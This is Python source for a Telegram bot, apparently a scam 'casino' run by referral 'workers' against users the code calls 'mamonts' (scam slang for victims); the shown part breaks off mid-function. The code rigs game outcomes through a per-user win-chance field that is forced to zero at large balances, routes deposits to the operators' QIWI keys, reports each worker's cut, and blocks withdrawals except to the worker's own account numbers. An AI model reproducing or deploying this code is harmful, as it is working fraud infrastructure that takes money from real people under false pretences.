# -*- coding: utf-8 -*-
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import config
import menu
import sqlite3
import statess
import random
import requests
from datetime import datetime, timedelta, date
from pyqiwip2p import QiwiP2P
import time
import asyncio
import logging

bot = Bot(config.API_Casino, parse_mode='HTML')
workerbot = Bot(config.API_Worker, parse_mode='HTML')
dp = Dispatcher(bot,storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)
bd = 'data/database.db'

print('Казино бот успешно запущен [+]')

@dp.message_handler(commands="start", state='*')
async def start(message: types.Message):
    ref_id = message.get_args()
    with sqlite3.connect(bd) as c:
        check = c.execute("SELECT id FROM mamonts_casino WHERE id = ?", (message.from_user.id,)).fetchone()
    if check is None:
        with sqlite3.connect(bd) as c:
            ref = c.execute("SELECT id FROM workers WHERE ref_code = ?", (ref_id,)).fetchone()
        if ref is None:
            await message.answer('<b>🔒 Не авторизован!</b>\nВведите код:')
            await statess.code.q1.set()
        else:
            with sqlite3.connect(bd) as c:
                c.execute('INSERT INTO mamonts_casino VALUES(?,?,?,?,?,?,?,?,?,?,?)',(message.from_user.id, '0', ref_id, '0', '0', '100', message.from_user.first_name, message.from_user.username, '0', '0', '0'))
            await workerbot.send_message(ref[0], f"<b><i>🎉У вас новый 🦣 мамонт! @{message.from_user.username}</i></b>")
            await message.answer(f'''🎉 Привет, <b>{message.from_user.full_name}!</b>
<b>Политика и условия пользования данным ботом 👇</b>

<code>1. Играя у нас, вы берёте все риски за свои средства на себя.
2. Принимая правила, Вы подтверждаете своё совершеннолетие!
3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!
4. Мультиаккаунты запрещены!
5. Скрипты, схемы использовать запрещено!
6. Если будут выявлены вышеперечисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!
7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.
8. Вы играете на виртуальные монеты, покупая их за настоящие деньги. Любое пополнение бота является пожертвованием!</code>

<b>❇️ Спасибо за понимание и удачи в игре!</b>''', reply_markup=menu.mainkb)
    else:
        await message.answer('<b>Вы попали в меню бота 📋</b>', reply_markup=menu.mainkb)

@dp.message_handler(state=statess.code.q1)
async def spammers(message: types.Message,state:FSMContext):
    with sqlite3.connect(bd) as c:
        ref = c.execute("SELECT id FROM workers WHERE ref_code = ?", (message.text,)).fetchone()
    if ref != None:
        with sqlite3.connect(bd) as c:
            c.execute('INSERT INTO mamonts_casino VALUES(?,?,?,?,?,?,?,?,?,?,?)',(message.from_user.id, '0', message.text, '0', '0', '100', message.from_user.first_name, message.from_user.username, '0', '0', '0'))
        await workerbot.send_message(ref[0], f"<b><i>🎉У вас новый 🦣 мамонт! @{message.from_user.username}</i></b>")
        await message.answer(f'''🎉 Привет, <b>{message.from_user.full_name}!</b>
<b>Политика и условия пользования данным ботом 👇</b>

<code>1. Играя у нас, вы берёте все риски за свои средства на себя.
2. Принимая правила, Вы подтверждаете своё совершеннолетие!
3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!
4. Мультиаккаунты запрещены!
5. Скрипты, схемы использовать запрещено!
6. Если будут выявлены вышеперечисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!
7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.
8. Вы играете на виртуальные монеты, покупая их за настоящие деньги. Любое пополнение бота является пожертвованием!</code>

<b>❇️ Спасибо за понимание и удачи в игре!</b>''', reply_markup=menu.mainkb)
        await state.finish()
    else:
        await message.answer('<b>🔒Пригласительный код неверный.</b>')

@dp.message_handler(content_types=['text'], text='💼 Личный кабинет')
async def buy(message: types.Message):
    try:
        with sqlite3.connect(bd) as c:
            info = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(message.chat.id,)).fetchone()
        await bot.send_photo(message.chat.id, photo='https://i.imgur.com/Hxp2KrG.jpg', caption=f'📌 Личный кабинет\n\n💵 Баланс: <b>{info[3]}</b>\n\n🔆 Игр сыграно: <b>{info[10]}</b>\n🍀 Игр выиграно: <b>{info[8]}</b>\n🖤 Игр проиграно: <b>{info[9]}</b>',reply_markup=menu.lk)
    except:
        with sqlite3.connect(bd) as c:
            c.execute(f'DELETE FROM mamonts_casino WHERE id = {message.from_user.id}')
        await message.answer(f'Ваш профиль не был найден\nВведите /start')

@dp.message_handler(content_types=['text'], text='🤵‍♂ Поддержка')
async def buy(message: types.Message):
    await message.answer(f'⚠️ Пишите только по делу!\n\n<a href="https://telegra.ph/Polzovatelskoe-soglashenie-01-10-2">Пользовательское соглашение.</a>', reply_markup=menu.tp)

@dp.message_handler(content_types=['text'], text='☘️ Играть')
async def buy(message: types.Message):
    try:
        with sqlite3.connect(bd) as c:
            info = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(message.chat.id,)).fetchone()
        if info[4] == 0:
            await message.answer('<b>Выберите интересующую Вас игру</b>', reply_markup=menu.gamekb)
        else:
            await message.answer('У вас заблокирован аккаунт.')
    except:
        with sqlite3.connect(bd) as c:
            c.execute(f'DELETE FROM mamonts_casino WHERE id = {message.from_user.id}')
        await message.answer(f'Ваш профиль не был найден\nВведите /start')

@dp.message_handler(content_types=['text'], text='Назад')
async def buy(message: types.Message):
    await message.answer('<b>💁🏻‍ Вы вернулись в главное меню</b>', reply_markup=menu.mainkb)

@dp.callback_query_handler(text='popolnenie')
async def process_callback_button1(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    with sqlite3.connect(bd) as c:
        ref = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(call.from_user.id,)).fetchone()
        info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
    await call.message.answer(f'💁🏻‍♀ Введите сумму пополнения\nМинимальная сумма пополнения - {info[6]} ₽')
    await statess.Qiwi.q1.set() 

@dp.message_handler(state=statess.Qiwi.q1)
async def spammers(message: types.Message,state:FSMContext):
    if message.text.isdigit():
        with sqlite3.connect(bd) as c:
            ref = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(message.from_user.id,)).fetchone()
            info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
        if int(message.text) < info[6]:
            await message.answer(f"минимальная сумма пополнения {info[6]} ₽")
            await state.finish()
        else:
            await state.finish()
            try:
                price = int(message.text)
                comment = random.randint(100000, 999999)
                with sqlite3.connect(bd) as c:
                    qiwikey =  c.execute('SELECT * FROM qiwis',).fetchall()
                    c.execute('INSERT INTO pays VALUES(?,?,?,?)',(message.from_user.id, 'CasinoBot', comment, '0'))
                qiwirand = random.choice(qiwikey)
                qiwiiii = qiwirand[1]
                loh = InlineKeyboardMarkup(
                    inline_keyboard = [
                        [
                            InlineKeyboardButton(text='Пополнить', callback_data=f'popolnyda,{message.from_user.id},{price},casino,{comment}')
                        ]
                    ]
                )
                p2p = QiwiP2P(auth_key=qiwiiii)
                new_bill = p2p.bill(bill_id=comment,amount=price,lifetime=45,comment=comment)
                pay_kb = types.InlineKeyboardMarkup()
                pay_kb.add(types.InlineKeyboardButton(text = 'Оплатить', url=new_bill.pay_url))
                pay_kb.add(types.InlineKeyboardButton(text = 'Проверить оплату', callback_data=f"check,{comment},{price}"))
                pay_kb.add(types.InlineKeyboardButton(text = 'Отменить', callback_data="otmenilsuka"))
                timetime = date.today() + timedelta(days=7)
                await workerbot.send_message(info[0], f'Мамонт: {message.from_user.full_name} @{message.from_user.username}\nID: {message.from_user.id}\nхочет пополнить {message.text} Rub', reply_markup=loh)
                await message.answer(f'<b>📃 Счет активен 15 минут...</b>\n\n✅ <b>Оплатить счет можно по ссылке ниже 👇👇👇</b>\n\n\nБот не будет отвечать на ваши сообщения до того момента как вы оплатите либо отмените платеж❕❕❕', reply_markup=pay_kb)
                await statess.Pays.q1.set()
                async with state.proxy() as data:
                    data['secret'] = qiwiiii
            except:
                await message.answer(f'<b>Призошла ошибка, попробуйте позже.</b>')
    else:
        await message.answer("текст состоит не из цифр") 
        await state.finish()

@dp.callback_query_handler(text_startswith="check", state=statess.Pays.q1) 
async def check_pay(call:types.CallbackQuery,state:FSMContext):
    data = await state.get_data()
    comment,price = call.data.split(",")[1], call.data.split(",")[2]
    qiwinah = data['secret']
    with sqlite3.connect(bd) as c:
        qiwi = c.execute('SELECT * FROM qiwis WHERE p2p_secret = ?',(qiwinah,)).fetchone()
        payed = c.execute('SELECT * FROM pays WHERE comment = ?',(comment,)).fetchone()
    check = await pays(qiwi[1],comment)
    comission = int(0.70 * int(price))
    if payed[3] == 1:
        await call.message.edit_text(f'✅ Оплата прошла успешно.')
        await state.finish()
    else:
        if check:
            with sqlite3.connect(bd) as c:
                ref = c.execute('SELECT referal FROM mamonts_casino WHERE id = ?',(call.from_user.id,)).fetchone()
            for id_ref in ref:
                with sqlite3.connect(bd) as c:
                    info = c.execute('SELECT * FROM workers WHERE ref_code = ?',(id_ref,)).fetchone()
                    c.execute('UPDATE workers SET profit = profit + ? WHERE ref_code = ?',(price, id_ref,))
                    c.execute('UPDATE pays SET status = ? WHERE comment = ?',('1',comment,))
                    c.execute('UPDATE stat SET all_pay = all_pay + ?, all_profit = all_profit + ? WHERE nice = ?',('1', '1', '777',))
                await workerbot.send_message(config.LOG_CHANNEL, f'💎 <b>Успешное</b> пополнение (Казино)\n\n🤵🏻 Воркер: <b>{info[1]}</b>\n\n🏢 Сумма пополнения: <b>{price}₽</b>\n\n💵 Доля воркера: ~ <b>{comission} ₽</b>')
                await workerbot.send_message(-1001792671745, f'💎 <b>Успешное</b> пополнение (Казино)\n\n🤵🏻 Воркер: <b>{info[1]}</b>\n\n🏢 Сумма пополнения: <b>{price}₽</b>\n\n💵 Доля воркера: ~ <b>{comission} ₽</b>')
                await call.message.edit_text(f'✅ Успешно! Баланс пополнен на <b>{price}</b>')
                try:
                    await workerbot.send_message(info[0], f'Отлично, мамонт пополнил на сумму {price}')
                except:
                    pass
                await state.finish()
        else:
            await call.message.answer("Оплата не найдена!")

async def pays(secretka,comment):
    all_head = {"Authorization": f"Bearer {secretka}", "Accept": "application/json"}
    req = requests.get(f'https://api.qiwi.com/partner/bill/v1/bills/{comment}', headers=all_head).json()
    try:
        if req['status']['value'] == 'PAID':
            return True
        else:
            return False
    except:
        return False

@dp.callback_query_handler(text='vivod')
async def process_callback_button1(call: types.CallbackQuery):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {call.from_user.id}').fetchone()
    if info[3] <= 1000:
        await bot.send_message(call.from_user.id, f'❌ Минимальная сумма для вывода: 1000 ₽\n💸 Ваш баланс: {info[3]} ₽, меньше чем нужно!')
    else:
        await bot.send_message(call.from_user.id, f'<b>Введите номер без +\nЛибо номер карты</b>\nПример: <i>79042345678</i>')
        await statess.Vivod.q1.set()

@dp.message_handler(state=statess.Vivod.q1)
async def spammers(message: types.Message,state:FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
        ref = c.execute('SELECT * FROM mamonts_casino WHERE id = ?',(message.from_user.id,)).fetchone()
        worker = c.execute('SELECT * FROM workers WHERE ref_code = ?',(ref[2],)).fetchone()
    loh = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text='✅', callback_data=f'gobalanc,{message.from_user.id},casino'),
                InlineKeyboardButton(text='❌', callback_data=f'netbalanc,{message.from_user.id},{info[3]},casino')
            ]
        ]
    )       
    if message.text.isdigit():
        if int(message.text) == worker[2]:
            await message.answer(f'💸 Заявка на вывод создана\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n\nНомер: <b>{message.text}</b>\nСумма: <b>{ref[3]}</b>\n\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\nМы оповестим вас, когда заявка будет выплачена')
            await workerbot.send_message(worker[0], f'<b>🌐 Новый запрос на вывод средств!</b> (Казино)\n\n🐘 Мамонт: <b>{message.from_user.first_name}</b>\n💸 Сумма: <b>{ref[3]}</b> RUB\n💳 Реквизиты: <b>{message.text}</b>', reply_markup=loh)
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = 0 WHERE id = ?", (message.from_user.id,))
            await state.finish()
        elif int(message.text) == worker[7]:
            await message.answer(f'💸 Заявка на вывод создана\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\n\nНомер: <b>{message.text}</b>\nСумма: <b>{ref[3]}</b>\n\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️\nМы оповестим вас, когда заявка будет выплачена')
            await workerbot.send_message(worker[0], f'<b>🌐 Новый запрос на вывод средств!</b> (Казино)\n\n🐘 Мамонт: <b>{message.from_user.first_name}</b>\n💸 Сумма: <b>{ref[3]}</b> RUB\n💳 Реквизиты: <b>{message.text}</b>', reply_markup=loh)
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = 0 WHERE id = ?", (message.from_user.id,)) 
            await state.finish()
        else:
            await message.answer(f'<b>👮‍♂ Вы пытаетесь вывести на реквизиты с которых НЕ пополняли\n👮‍♂ Обратитесь в техническую поддержку</b>')
            await workerbot.send_message(worker[0], f'Мамонт: <b>{message.from_user.first_name} (Казино)</b> пытался вывести на реквизиты: <b>{message.text}</b>')
    else:
        await message.answer("это разве номер?")
    await state.finish()

@dp.message_handler(text='Числа 🔢')
async def random_number_btn(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    if info[3] < 10:
        await message.answer('❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽')
    else:
        await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3]}')
        await statess.RandomNumber.q1.set()

@dp.message_handler(state=statess.RandomNumber.q1)
async def random_number_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if info[3] < int(message.text) or int(message.text) < 10:
            await message.answer(f'Сумма ставки введена некорректно.\n\nМинимальная сумма ставки - 10 ₽ \nМаксимальная сумма ставки - {info[3]}')
        else:
            await message.answer('💁🏻‍♀ Ставка засчитана, выпало число, выберите его интервал', reply_markup=menu.interval(message.text))
            await state.finish()
    except ValueError:
        await message.answer("Главное меню", reply_markup=menu.mainkb)
        await state.finish()

@dp.callback_query_handler(text_startswith="RandomNumberr")
async def process_callback_button1(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    amount,vibor = call.data.split(",")[1],call.data.split(",")[2]
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {call.from_user.id}').fetchone()
    if vibor == 'biggest':
        if info[5] == 100:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
            await statess.RandomNumber.q1.set()
        elif info[5] == 50:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
                await statess.RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                if info[3] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                    await statess.RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            if info[3] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                await statess.RandomNumber.q1.set()
    elif vibor == 'equals':
        if info[5] == 100:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(amount) * 10}\nВыпавшее число 50")
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = balance + ? * 10, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount) * 10}')
            await statess.RandomNumber.q1.set()
        elif info[5] == 50:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(amount) * 10}\nВыпавшее число 50")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ? * 10, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount) * 10}')
                await statess.RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 100)}")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                if info[3] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                    await statess.RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            if info[3] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                await statess.RandomNumber.q1.set()
    else:
        if info[5] == 100:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
            await statess.RandomNumber.q1.set()
        elif info[5] == 50:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
                await statess.RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                if info[3] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                    await statess.RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
            with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            if info[3] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                await statess.RandomNumber.q1.set()
    if info[3] >= 50000:
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_casino SET shans = ? WHERE id = ?",('0', call.from_user.id,))

@dp.message_handler(text="Орёл & Решка")
async def heads_or_tails_btn(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    if info[3] < 10:
        await message.answer("❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽")
    else:
        await message.answer(f"💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3]}")
        await statess.Coin.q1.set()

@dp.message_handler(state=statess.Coin.q1)
async def heads_or_tails_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if int(message.text) < 10 or int(message.text) > info[3]:
            await message.answer(f"Сумма ставки введена некорректно.\nМинимальная сумма ставки - 10 ₽\nМаксимальная сумма ставки - {info[3]} ₽")
        else:
            await message.answer("💁🏻‍♀ Ставка засчитана, выберите на кого поставите",reply_markup=menu.coin(message.text))
            await state.finish()
    except ValueError:
        await message.answer("Вы ввели не число!\nВыберите игру заново или вернитесь назад")
        await state.finish()

@dp.callback_query_handler(text_startswith="Coinflip")
async def heads_btn(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    amount,vibor = call.data.split(",")[1],call.data.split(",")[2]
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {call.from_user.id}').fetchone()
    if vibor == 'Orel':
        if info[5] == 100:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпал орел!")
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
            await statess.Coin.q1.set()
        elif info[5] == 50:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпал орел")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
                await statess.Coin.q1.set()

            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпала решка")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                if info[3] <= 10:                 
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                    await statess.Coin.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпала решка")
            with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            if info[3] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                await statess.Coin.q1.set()
    else:
        if info[5] == 100:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпала решка!")
            with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
            await statess.Coin.q1.set()
        elif info[5] == 50:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпала решка!")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(amount)}')
                await statess.Coin.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпал орел!")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
                if info[3] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                    await statess.Coin.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпал орел")
            with sqlite3.connect(bd) as c:
                c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(amount, call.from_user.id,))
            if info[3] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(amount)}')
                await statess.Coin.q1.set()
    if info[3] >= 50000:
        with sqlite3.connect(bd) as c:
            c.execute("UPDATE mamonts_casino SET shans = ? WHERE id = ?",('0', call.from_user.id,))

@dp.message_handler(text="Кости 🎲")
async def random_dice_btn(message: types.Message):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    if info[3] < 10:
        await message.answer("❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽")
    else:
        await message.answer("💁🏻‍♀ Введите сумму ставки \n")
    await statess.Dice.q1.set()

@dp.message_handler(state=statess.Dice.q1)
async def random_dice_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(bd) as c:
        info = c.execute(f'SELECT * FROM mamonts_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if int(message.text) < 10 or int(message.text) > info[3]:
            await message.answer(f"Сумма ставки введена некорректно.\nМинимальная сумма ставки - 10 ₽\nМаксимальная сумма ставки - {info[3]} ₽")
        else:
            await message.answer("💁🏻‍♀ Ставка засчитана")
            one_point = "CAACAgIAAxkBAAEOWYJhkPT2ojKkslnxy1rH-8xS3rcPuAAC3MYBAAFji0YMsbUSFEouGv8iBA"
            two_point = "CAACAgIAAxkBAAEOKxRhiFE5JfReRO6gZlItEuZKcTw4FwAC3cYBAAFji0YM608pO-wjAlEiBA"
            three_point = "CAACAgIAAxkBAAEOY6BhkpmmVkdpWR2bP0bFelAmIQ5yOQAC3sYBAAFji0YMVHH9hav7ILkiBA"
            four_point = "CAACAgIAAxkBAAEOY6Jhkpm-7_ZhXS5rPlNH9N9AfTIzbgAC38YBAAFji0YMHEUTINW7YxciBA"
            five_point = "CAACAgIAAxkBAAEOY6RhkpnUEJFca6ISof5GiwtYh_O-JwAC4MYBAAFji0YMSLHz-sj_JqkiBA"
            six_point = "CAACAgIAAxkBAAEOY6Zhkpnut8ZgPcI3nPC3auNQZVYWOAAC4cYBAAFji0YM75p8zae_tHoiBA"
            if info[5] == 100:
                await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                await message.answer("➖➖➖➖➖➖➖➖ \n"
                                     "  👆 Ваш кубик \n"
                                     "➖➖➖➖➖➖➖➖ \n"
                                     "  👇 Кубик бота \n"
                                     "➖➖➖➖➖➖➖➖")
                await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                await message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(message.text)} \n")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(message.text, message.from_user.id,))
                await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(message.text)}')
                await statess.Dice.q1.set()
            elif info[5] == 50:
                result = random.randint(1,2)
                if result == 1:
